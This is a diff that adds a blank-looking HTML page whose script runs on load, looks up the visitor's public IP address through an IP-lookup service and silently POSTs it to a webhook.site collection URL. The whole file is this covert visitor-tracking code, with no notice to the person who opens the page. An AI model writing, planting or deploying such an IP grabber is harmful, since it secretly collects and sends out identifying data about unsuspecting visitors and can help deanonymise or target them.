@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(data => {
+    const ip = data.ip;
+    fetch('https://webhook.site/4e4d1de4-0c97-467f-b45e-a110bf13c756', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ip: ip })
+    });
+  });
+</script>
+</body>
+</html>
